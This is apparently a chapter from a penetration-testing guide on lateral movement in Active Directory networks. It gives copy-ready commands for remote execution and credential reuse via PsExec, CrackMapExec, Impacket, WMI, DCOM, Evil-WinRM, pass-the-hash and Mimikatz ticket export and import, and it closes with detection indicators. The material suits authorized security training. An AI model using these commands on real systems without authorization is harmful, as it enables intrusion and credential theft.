# Chapter 10: Lateral Movement

Lateral movement is the process of moving from one system to another within an Active Directory environment. Once an attacker gains an initial foothold and elevates privileges, they must move laterally to reach critical assets, such as the Domain Controller or file servers containing sensitive data.

## PsExec

PsExec is a legitimate Sysinternals tool that allows users to execute processes on remote systems. It is frequently abused by attackers to execute code on remote hosts using stolen credentials or hashes.

### How it works
- PsExec uses the SMB protocol to copy a service executable (`PSEXESVC.exe`) to the target machine's `ADMIN$` share.
- It then creates a service on the remote machine to execute the specified command.
- Finally, it deletes the service and the executable.

### Example using PsExec

```cmd
# Command Prompt
psexec.exe \\<TargetIP> -u <Domain>\<Username> -p <Password> cmd.exe
```

### Example using CrackMapExec

```bash
# Using CrackMapExec (SMB)
crackmapexec smb <TargetIP> -u <Username> -p <Password> -x "whoami"
```

### Example using Impacket (psexec.py)

```bash
# Using Impacket
python3 psexec.py <Domain>/<Username>:<Password>@<TargetIP>
```

## WMI (Windows Management Instrumentation)

WMI is a set of extensions to the Windows Driver Model that provides an operating system interface through which instrumented components provide information and notification. It can be used for remote execution.

### How it works
- WMI allows attackers to execute commands on remote systems without writing files to disk or creating services, making it stealthier than PsExec.

### Example using PowerShell

```powershell
# PowerShell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName <TargetIP> -Credential (Get-Credential)
```

### Example using CrackMapExec

```bash
# Using CrackMapExec (WMI)
crackmapexec wmi <TargetIP> -u <Username> -p <Password> -x "whoami"
```

## WinRM (Windows Remote Management)

WinRM is the Microsoft implementation of WS-Management Protocol, a standard Simple Object Access Protocol (SOAP)-based, firewall-friendly protocol that allows hardware and operating systems from different vendors to interoperate.

### How it works
- WinRM uses HTTP (port 5985) or HTTPS (port 5986) for remote management.
- It requires the `Remote Management Users` group membership or local admin rights.

### Example using PowerShell

```powershell
# PowerShell
Enter-PSSession -ComputerName <TargetIP> -Credential (Get-Credential)
```

### Example using Evil-WinRM

```bash
# Using Evil-WinRM
evil-winrm -i <TargetIP> -u <Username> -p <Password>
```

## SMB

Server Message Block (SMB) is a network file sharing protocol. It is used extensively for lateral movement, particularly for copying malware or dumping credentials.

### Example using CrackMapExec

```bash
# Using CrackMapExec (SMB)
crackmapexec smb <TargetIP> -u <Username> -p <Password>
```

### Example using Impacket (smbclient.py)

```bash
# Using Impacket
python3 smbclient.py <Domain>/<Username>:<Password>@<TargetIP>
```

## RDP (Remote Desktop Protocol)

RDP provides a graphical interface for connecting to a remote computer. While noisy and easily detected, it is sometimes used for lateral movement.

### Example using xfreerdp

```bash
# Using xfreerdp
xfreerdp /u:<Username> /p:<Password> /v:<TargetIP> /w:1366 /h:768
```

## DCOM (Distributed Component Object Model)

DCOM allows software components to communicate across networked computers. It can be abused for remote execution.

### Example using PowerShell

```powershell
# PowerShell
$dcom = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "<TargetIP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami", "7")
```

## Remote Services

Remote services (e.g., SSH, FTP) can be used for lateral movement if they are enabled and accessible.

### Example using SSH

```bash
# Using SSH
ssh <Username>@<TargetIP>
```

## Pass-the-Hash (PtH)

Pass-the-Hash allows an attacker to authenticate to a remote system using the user's NTLM hash, without knowing the plaintext password.

### Example using CrackMapExec

```bash
# Using CrackMapExec for PtH
crackmapexec smb <TargetIP> -u <Username> -H <NTLM_Hash>
```

### Example using Impacket (psexec.py)

```bash
# Using Impacket for PtH
python3 psexec.py <Domain>/<Username>@<TargetIP> -hashes :<NTLM_Hash>
```

## Pass-the-Ticket

Pass-the-Ticket involves stealing a valid Kerberos ticket (TGT or ST) from one machine and using it on another machine to authenticate.

### Example using Mimikatz

```text
# Mimikatz (export tickets)
mimikatz # sekurlsa::tickets /export
# Mimikatz (import tickets on target)
mimikatz # kerberos::ptt <Ticket_File>
```

## Detection

### Detection Methods
- **Event Logs**: Monitor for Event ID 4624 (Logon success) with Logon Type 3 (Network) or Logon Type 10 (RDP).
- **Process Creation**: Look for the creation of `PSEXESVC.exe` or unusual processes spawned by `WmiPrvSE.exe` or `svchost.exe`.
- **Network Traffic**: Analyze SMB (port 445), WinRM (ports 5985/5986), and RDP (port 3389) traffic for anomalies.
- **Honey Tokens**: Use fake credentials or shares to detect unauthorized access attempts.

---
*Lateral movement connects the initial foothold to the ultimate target. The next chapter will explore AD CS attacks, a highly effective and often overlooked attack vector.*
